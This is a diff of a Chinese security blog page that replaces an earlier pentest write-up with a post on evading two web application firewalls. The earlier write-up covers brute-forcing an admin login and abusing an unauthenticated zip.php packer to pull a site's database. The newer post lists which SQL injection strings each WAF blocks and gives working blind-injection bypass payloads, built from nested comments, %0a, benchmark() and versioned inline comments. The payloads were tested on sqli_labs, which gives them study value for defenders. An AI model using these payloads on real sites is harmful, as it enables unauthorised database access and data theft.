@@ -16,42 +16,52 @@
 
 
 
-<meta name="description" content="前言：这次的渗透测试，常规漏洞不存在或者不好利用，却由于一个打包程序，导致网站沦陷。
+<meta name="description" content="前言：两个绕过的测试环境为sqli_labs+mysql。本文主要是以当时测试的思路来写的，还望各位师傅多多指教。
 
-0x00 信息搜集前期使用御剑扫描，得到的信息非常有限，nmap扫描端口也未发现敏感服务，然后访问robots.txt，发现如下信息：可以发现，其中有admin后台，访问如图：对于后台我一般会做如下尝试：
+0x00 某厂商WAF拦截语句按照之前的思路，首先尝试了各种常用的payload，看看WAF拦了哪些操作，发现如下语句会拦截：
 
-弱口令走一波
-在用户名处填写注入语句，一般使用’来测试
-若无验证码，可以尝试暴力破解；若有验证码，也可">
+and 1=1类型
+‘、%27
+union、select、union select、select from、sleep()
+/*!*/
+…
+
+放行语句">
 <meta property="og:type" content="article">
-<meta property="og:title" content="记一次奇葩的渗透测试">
-<meta property="og:url" content="http://e4st.world/2017/04/24/记一次奇葩的渗透测试/index.html">
+<meta property="og:title" content="两款防火墙的注入绕过姿势">
+<meta property="og:url" content="http://e4st.world/2017/09/24/两款WAF的注入绕过姿势/index.html">
 <meta property="og:site_name" content="e4st' blog">
-<meta property="og:description" content="前言：这次的渗透测试，常规漏洞不存在或者不好利用，却由于一个打包程序，导致网站沦陷。
+<meta property="og:description" content="前言：两个绕过的测试环境为sqli_labs+mysql。本文主要是以当时测试的思路来写的，还望各位师傅多多指教。
 
-0x00 信息搜集前期使用御剑扫描，得到的信息非常有限，nmap扫描端口也未发现敏感服务，然后访问robots.txt，发现如下信息：可以发现，其中有admin后台，访问如图：对于后台我一般会做如下尝试：
+0x00 某厂商WAF拦截语句按照之前的思路，首先尝试了各种常用的payload，看看WAF拦了哪些操作，发现如下语句会拦截：
 
-弱口令走一波
-在用户名处填写注入语句，一般使用’来测试
-若无验证码，可以尝试暴力破解；若有验证码，也可">
-<meta property="og:image" content="https://i.loli.net/2017/09/25/59c8621477e9f.png">
-<meta property="og:image" content="https://i.loli.net/2017/09/25/59c8623c23f93.png">
-<meta property="og:image" content="https://i.loli.net/2017/09/25/59c8622d91ead.png">
-<meta property="og:image" content="https://i.loli.net/2017/09/25/59c862514a0bf.png">
-<meta property="og:image" content="https://i.loli.net/2017/09/25/59c8624c93f8e.png">
-<meta property="og:image" content="https://i.loli.net/2017/09/25/59c862656ff56.png">
-<meta property="og:image" content="https://i.loli.net/2017/09/25/59c862208e248.png">
-<meta property="og:updated_time" content="2017-09-25T02:01:15.000Z">
+and 1=1类型
+‘、%27
+union、select、union select、select from、sleep()
+/*!*/
+…
+
+放行语句">
+<meta property="og:image" content="https://i.loli.net/2017/10/13/59e01f47a4d38.jpg">
+<meta property="og:image" content="https://i.loli.net/2017/10/13/59e02adbe8a72.png">
+<meta property="og:image" content="https://i.loli.net/2017/10/13/59e05ba34408b.png">
+<meta property="og:image" content="https://i.loli.net/2017/10/13/59e05c5773da1.png">
+<meta property="og:image" content="https://i.loli.net/2017/10/13/59e05e4f0c0f2.png">
+<meta property="og:updated_time" content="2017-10-13T06:52:34.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="记一次奇葩的渗透测试">
-<meta name="twitter:description" content="前言：这次的渗透测试，常规漏洞不存在或者不好利用，却由于一个打包程序，导致网站沦陷。
+<meta name="twitter:title" content="两款防火墙的注入绕过姿势">
+<meta name="twitter:description" content="前言：两个绕过的测试环境为sqli_labs+mysql。本文主要是以当时测试的思路来写的，还望各位师傅多多指教。
 
-0x00 信息搜集前期使用御剑扫描，得到的信息非常有限，nmap扫描端口也未发现敏感服务，然后访问robots.txt，发现如下信息：可以发现，其中有admin后台，访问如图：对于后台我一般会做如下尝试：
+0x00 某厂商WAF拦截语句按照之前的思路，首先尝试了各种常用的payload，看看WAF拦了哪些操作，发现如下语句会拦截：
 
-弱口令走一波
-在用户名处填写注入语句，一般使用’来测试
-若无验证码，可以尝试暴力破解；若有验证码，也可">
-<meta name="twitter:image" content="https://i.loli.net/2017/09/25/59c8621477e9f.png">
+and 1=1类型
+‘、%27
+union、select、union select、select from、sleep()
+/*!*/
+…
+
+放行语句">
+<meta name="twitter:image" content="https://i.loli.net/2017/10/13/59e01f47a4d38.jpg">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -83,7 +93,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>记一次奇葩的渗透测试 | e4st&#39; blog</title>
+<title>两款防火墙的注入绕过姿势 | e4st&#39; blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -257,11 +267,11 @@ var _hmt = _hmt || [];
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-记一次奇葩的渗透测试" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-两款WAF的注入绕过姿势" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2017/04/24/记一次奇葩的渗透测试/" class="article-date">
-      <time datetime="2017-04-24T08:55:01.000Z" itemprop="datePublished">2017-04-24</time>
+      <a href="/2017/09/24/两款WAF的注入绕过姿势/" class="article-date">
+      <time datetime="2017-09-24T12:25:04.000Z" itemprop="datePublished">2017-09-24</time>
 </a>
 
 
@@ -276,7 +286,7 @@ var _hmt = _hmt || [];
         
   
     <h1 class="article-title" itemprop="name">
-      记一次奇葩的渗透测试
+      两款防火墙的注入绕过姿势
     </h1>
   
 
@@ -287,7 +297,7 @@ var _hmt = _hmt || [];
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/代码审计/">代码审计</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/渗透测试/">渗透测试</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/bypass/">bypass</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -298,22 +308,62 @@ var _hmt = _hmt || [];
       
           
         <hr>
-<p>前言：这次的渗透测试，常规漏洞不存在或者不好利用，却由于一个打包程序，导致网站沦陷。</p>
+<p>前言：两个绕过的测试环境为sqli_labs+mysql。本文主要是以当时测试的思路来写的，还望各位师傅多多指教。</p>
 <hr>
-<h1 id="0x00-信息搜集"><a href="#0x00-信息搜集" class="headerlink" title="0x00 信息搜集"></a>0x00 信息搜集</h1><p>前期使用御剑扫描，得到的信息非常有限，nmap扫描端口也未发现敏感服务，然后访问robots.txt，发现如下信息：<br><img src="https://i.loli.net/2017/09/25/59c8621477e9f.png" alt=""><br>可以发现，其中有admin后台，访问如图：<br><img src="https://i.loli.net/2017/09/25/59c8623c23f93.png" alt=""><br>对于后台我一般会做如下尝试：</p>
+<h1 id="0x00-某厂商WAF"><a href="#0x00-某厂商WAF" class="headerlink" title="0x00 某厂商WAF"></a>0x00 某厂商WAF</h1><h2 id="拦截语句"><a href="#拦截语句" class="headerlink" title="拦截语句"></a>拦截语句</h2><p>按照之前的思路，首先尝试了各种常用的payload，看看WAF拦了哪些操作，发现如下语句会拦截：</p>
 <ul>
-<li>弱口令走一波</li>
-<li>在用户名处填写注入语句，一般使用’来测试</li>
-<li>若无验证码，可以尝试暴力破解；若有验证码，也可以尝试暴力破解 </li>
+<li>and 1=1类型</li>
+<li>‘、%27</li>
+<li>union、select、union select、select from、sleep()</li>
+<li>/*!*/</li>
+<li>…</li>
 </ul>
-<p>做完尝试之后发现此处并没有注入，但后台能够进行暴力破解，验证码不会失效。然后拿出一堆几十年前的字典狂爆一波，最后GG。。。。</p>
-<h1 id="0x01-尝试可能的漏洞"><a href="#0x01-尝试可能的漏洞" class="headerlink" title="0x01 尝试可能的漏洞"></a>0x01 尝试可能的漏洞</h1><p>  前面没发现太多有用的东西，还是看看站点本身。按照习惯，去放问了网站新闻等内容，通常类似<code>php?id=</code>的url有可能有注入等漏洞，兴高采烈的去各种尝试，后来发现页面不会有任何改变，这里猜测后台应该使用了intval等函数强制转换过。<br>  注入看来是没戏了，然后又发现了一个msg.php，打开一看，果然是留言板，插入xss恶意代码盲打一波。结果到最后，没有任何收获，无解啊。<br>  到目前为止，我们只有一个暴力破解可以使用，奈何字典不够强大，我们怎么继续下去呢？</p>
+<h2 id="放行语句"><a href="#放行语句" class="headerlink" title="放行语句"></a>放行语句</h2><p>在上面尝试中发现如下语句未被拦截：</p>
 <ul>
-<li>旁注？醒醒吧，就这一个站！</li>
-<li>C段？挺花时间的要不继续看看？</li>
+<li>order by</li>
+<li>/**/</li>
+<li>/*/**/and if(1,1,0) </li>
+<li>%0a、%0b…</li>
+<li>order by x</li>
+<li>…<blockquote>
+<p>对于第三个payload，最先尝试的是?id=1 and if(1,1,0)，被拦截，然后猜测问题在于and这里，就在前面加了一个/**/进行尝试，发现还是失败，然后在注释中多加了/*，成功绕过，/*/*/也是可行的<br>测试发现，若响应内容含有敏感信息(mysql错误信息)，会被WAF重置连接。所以需要构造一个可以执行成功的sql语句</p>
+</blockquote>
+</li>
 </ul>
-<h1 id="0x02-再次收集信息"><a href="#0x02-再次收集信息" class="headerlink" title="0x02 再次收集信息"></a>0x02 再次收集信息</h1><p>  这次我祭出了更强大的御剑，不对，是更强大的字典，终于皇天不负有心人，在强大的字典面前，一个叫<code>zip.php</code>进入了我的视线，打开如下图：<br><img src="https://i.loli.net/2017/09/25/59c8622d91ead.png" alt=""><br>  这是一个打包程序，我们能不能把源码打包直接下载下来，这样我们不就有可能获得管理员的账号密码了嘛？然而看到这里需要输入密码，可能我们又会去爆破，但是这里有更有价值的信息，我们访问图中的url，下载这套代码，第一行代码吸引了我：<br><img src="https://i.loli.net/2017/09/25/59c862514a0bf.png" alt=""><br>  尝试失败，说明管理员修改了密码。怎么办呢？我们能不能绕过登陆直接打包呢？<br>  我们可以来审一下代码：<br><img src="https://i.loli.net/2017/09/25/59c8624c93f8e.png" alt=""><br>  可以看到，当<code>$_REQUEST[&quot;myaction&quot;])</code>没有传到后台时，则显示密码框，需要用户登陆，若<code>$_REQUEST[&quot;myaction&quot;]) == &#39;dolist&#39;</code>时，需要验证密码，我们跳过这段，看看后面是否还有<code>else if</code>这类代码，结果发现有如下代码：<br><img src="https://i.loli.net/2017/09/25/59c862656ff56.png" alt=""><br>  也就是说，当<code>$_REQUEST[&quot;myaction&quot;]) == &#39;dozip&#39;</code>时，程序就会执行打包函数，无需登录即可完成打包，只要找到需要打包的参数的代码就OK了。<br><img src="https://i.loli.net/2017/09/25/59c862208e248.png" alt=""><br>  可以发现，value这里的值改为对应目录，就可以执行打包了<br>结果打包下来，只有一个sql文件(然而压缩文件1.1G,解压就一个400多k的sql文件？？)<br>从sql里面发现了管理员账号密码，后续的上传shell也非常简单，这里就不多说了。</p>
-<h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>  信息搜集才是王道，只有搜集到足够多有用的信息，思路也自然会打开。然后就请各位大佬，多多指教咯。</p>
+<h2 id="测试思路"><a href="#测试思路" class="headerlink" title="测试思路"></a>测试思路</h2><ol>
+<li>既然敏感信息会被重置连接，我们可以采用盲注的方式进行绕过<br>先尝试绕过<code>and 1=1/and &#39;a&#39;=&#39;a&#39;</code>的限制，验证是否存在注入<br>在安全狗测试中我们是使用内联注释过狗的，但这款WAF限制了内联注释，所以需要另外的方法。并且由于单引号也被禁止了，暂时未想到绕过方法，先尝试数字型注入的绕过<br>测试payload:<code>and 1 --</code>、<code>and 0 --</code><br><img src="https://i.loli.net/2017/10/13/59e01f47a4d38.jpg" alt=""></li>
+<li>接着我们尝试一下<code>and if</code>形式的注入语句：<br><code>/*/**/and if(substr(1,1,1)=1,1,0) -- -</code><br>未拦截，然后修改payload：<br><code>/*/**/and if(substr(user(),1,1)=&#39;r&#39;,1,0) -- -</code>，成功<br><img src="https://i.loli.net/2017/10/13/59e02adbe8a72.png" alt=""></li>
+<li>继续往下构造<br><code>/*/*/and if(substr((select/**/schema_name/*/**/from/**/(information_schema.schemata)limit 1 offset 0/*/**/),1,1)=&#39;i&#39;,1,0)-- -</code> 成功<br>select后面跟的/**/是关键<blockquote>
+<p>ps:上面这段payload之前尝试其实是失败的，写文章复现的时候发现居然能过，一脸懵逼。当时是针对select进行了尝试，使用%0aselect进行的绕过</p>
+</blockquote>
+</li>
+<li><p>这里其实还有个问题，针对sleep()函数的绕过，WAF对这块限制的很严，试过sleep/**/()、sleep/*/**/()等，均尝试失败<br>但是我们可以使用另外一个函数进行替代：benchmark()，最后构造payload如下：<br><code>/*/*/and if(substr(user/*/**/(),1,1)=&#39;r&#39;,benchmark(100000000,rand()),0)-- -</code> </p>
+<blockquote>
+<p>ps:我们这里是针对数字型注入进行的绕过，后来测试了字符型，发现<code>/*/**/&#39;</code>就可以过掉WAF，和上面<code>and if</code>的思路一致。针对union select的绕过，利用上述中的方法也是可以过的。</p>
+</blockquote>
+</li>
+</ol>
+<h1 id="0x01-360主机卫士"><a href="#0x01-360主机卫士" class="headerlink" title="0x01 360主机卫士"></a>0x01 360主机卫士</h1><blockquote>
+<p>ps:官网给出的更新日志是2015年12月，windows版本为：Windows 2.0.4.6</p>
+</blockquote>
+<p>同样，我们继续按照之前的思路来测试</p>
+<h2 id="拦截语句-1"><a href="#拦截语句-1" class="headerlink" title="拦截语句"></a>拦截语句</h2><ul>
+<li>select、select from、union select</li>
+<li>and 1=1类型</li>
+<li>/*!50000*/     #后续测试发现，只拦截了这一个，如/*!500001*/就不会被拦截</li>
+<li>…</li>
+</ul>
+<h2 id="放行语句-1"><a href="#放行语句-1" class="headerlink" title="放行语句"></a>放行语句</h2><ul>
+<li>单独使用的select、union、from</li>
+<li>‘</li>
+<li>/*!*/</li>
+<li>…</li>
+</ul>
+<h2 id="测试思路-1"><a href="#测试思路-1" class="headerlink" title="测试思路"></a>测试思路</h2><ol>
+<li>对于绕<code>and 1=1</code>类似语句方法和安全狗的一样，可以使用<code>and /*!1=1*/</code>或者<code>and /*!1*/=/*!1*/</code>来进行绕过<br>and if(substr(user(),1,1)=’r’,1,0)– -</li>
+<li>进行下一步测试时发现，payload:<code>and if(substr(user(),1,1)=&#39;r&#39;,1,0)-- -</code>未被拦截，可以直接执行<br><img src="https://i.loli.net/2017/10/13/59e05ba34408b.png" alt=""></li>
+<li>然后继续构造payload查询数据库：<code>and if(substr((select schema_name from information_schema.schemata limit 0,1),1,1)=&#39;i&#39;,1,0)-- -</code>，结果被拦截<br><img src="https://i.loli.net/2017/10/13/59e05c5773da1.png" alt=""><br>因为payload含有<code>select from</code><br>按照第一节中的方法，我们使用%0aselect的形式试图干扰WAF，失败<br>payload:<code>and if(substr((%0aselect schema_name from information_schema.schemata limit 0,1),1,1)=&#39;i&#39;,1,0)-- -</code><br>接着我们在from前面加上了%0a，还是失败<br>payload:<code>and if(substr((%0aselect schema_name%0afrom information_schema.schemata limit 0,1),1,1)=&#39;i&#39;,1,0)-- -</code><br>然后我尝试了对from使用内联注释，成功<br>payload:<code>and if(substr((%0aselect schema_name%0a/*!50001from*/ information_schema.schemata limit 0,1),1,1)=&#39;i&#39;,1,0)-- -</code><br><img src="https://i.loli.net/2017/10/13/59e05e4f0c0f2.png" alt=""><br>使用这种方法也可以绕过<code>union select</code>的限制，这里就不多说了<h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1>这次测试比之前安全狗测试的时候思路要清晰一些，但感觉还是有诸多不足，对于mysql的特性还需要积累总结。</li>
+</ol>
 
       
     </div>
@@ -322,13 +372,13 @@ var _hmt = _hmt || [];
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2017/04/24/记一次奇葩的渗透测试/">记一次奇葩的渗透测试</a></p>
+        <p><span>本文标题:</span><a href="/2017/09/24/两款WAF的注入绕过姿势/">两款防火墙的注入绕过姿势</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">c0deeast</a></p>
-        <p><span>发布时间:</span>2017-04-24, 16:55:01</p>
-        <p><span>最后更新:</span>2017-09-25, 10:01:15</p>
+        <p><span>发布时间:</span>2017-09-24, 20:25:04</p>
+        <p><span>最后更新:</span>2017-10-13, 14:52:34</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2017/04/24/记一次奇葩的渗透测试/" title="记一次奇葩的渗透测试">http://e4st.world/2017/04/24/记一次奇葩的渗透测试/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://e4st.world/2017/04/24/记一次奇葩的渗透测试/　　作者: c0deeast" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2017/09/24/两款WAF的注入绕过姿势/" title="两款防火墙的注入绕过姿势">http://e4st.world/2017/09/24/两款WAF的注入绕过姿势/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://e4st.world/2017/09/24/两款WAF的注入绕过姿势/　　作者: c0deeast" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -341,15 +391,15 @@ var _hmt = _hmt || [];
     <nav id="article-nav">
         
             <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2017/06/02/Samba远程命令执行漏洞(CVE-2017-7494)攻击演示/">
-                    Samba远程命令执行漏洞(CVE-2017-7494)攻击演示
+                <a href="/2017/09/24/打狗棒法-注入过狗姿势/">
+                    打狗棒法-注入过狗姿势
                 </a>
             </div>
         
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2017/02/08/hello-world/">
-                    Hello Hexo
+                <a href="/2017/06/02/Samba远程命令执行漏洞(CVE-2017-7494)攻击演示/">
+                    Samba远程命令执行漏洞(CVE-2017-7494)攻击演示
                 </a>
             </div>
         
@@ -361,7 +411,7 @@ var _hmt = _hmt || [];
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-信息搜集"><span class="toc-number">1.</span> <span class="toc-text">0x00 信息搜集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-尝试可能的漏洞"><span class="toc-number">2.</span> <span class="toc-text">0x01 尝试可能的漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-再次收集信息"><span class="toc-number">3.</span> <span class="toc-text">0x02 再次收集信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-总结"><span class="toc-number">4.</span> <span class="toc-text">0x03 总结</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-某厂商WAF"><span class="toc-number">1.</span> <span class="toc-text">0x00 某厂商WAF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#拦截语句"><span class="toc-number">1.1.</span> <span class="toc-text">拦截语句</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#放行语句"><span class="toc-number">1.2.</span> <span class="toc-text">放行语句</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#测试思路"><span class="toc-number">1.3.</span> <span class="toc-text">测试思路</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-360主机卫士"><span class="toc-number">2.</span> <span class="toc-text">0x01 360主机卫士</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#拦截语句-1"><span class="toc-number">2.1.</span> <span class="toc-text">拦截语句</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#放行语句-1"><span class="toc-number">2.2.</span> <span class="toc-text">放行语句</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#测试思路-1"><span class="toc-number">2.3.</span> <span class="toc-text">测试思路</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-总结"><span class="toc-number">3.</span> <span class="toc-text">0x03 总结</span></a></li></ol>
         
     </div>
     <style>
@@ -397,7 +447,7 @@ var _hmt = _hmt || [];
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"记一次奇葩的渗透测试　| e4st' blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"两款防火墙的注入绕过姿势　| e4st' blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -417,7 +467,7 @@ var _hmt = _hmt || [];
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2017/06/02/Samba远程命令执行漏洞(CVE-2017-7494)攻击演示/" title="上一篇: Samba远程命令执行漏洞(CVE-2017-7494)攻击演示">
+            <a href="/2017/09/24/打狗棒法-注入过狗姿势/" title="上一篇: 打狗棒法-注入过狗姿势">
                 <i class="fa fa-angle-left"></i>
             </a>
         
@@ -425,7 +475,7 @@ var _hmt = _hmt || [];
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2017/02/08/hello-world/" title="下一篇: Hello Hexo">
+            <a href="/2017/06/02/Samba远程命令执行漏洞(CVE-2017-7494)攻击演示/" title="下一篇: Samba远程命令执行漏洞(CVE-2017-7494)攻击演示">
                 <i class="fa fa-angle-right"></i>
             </a>
         
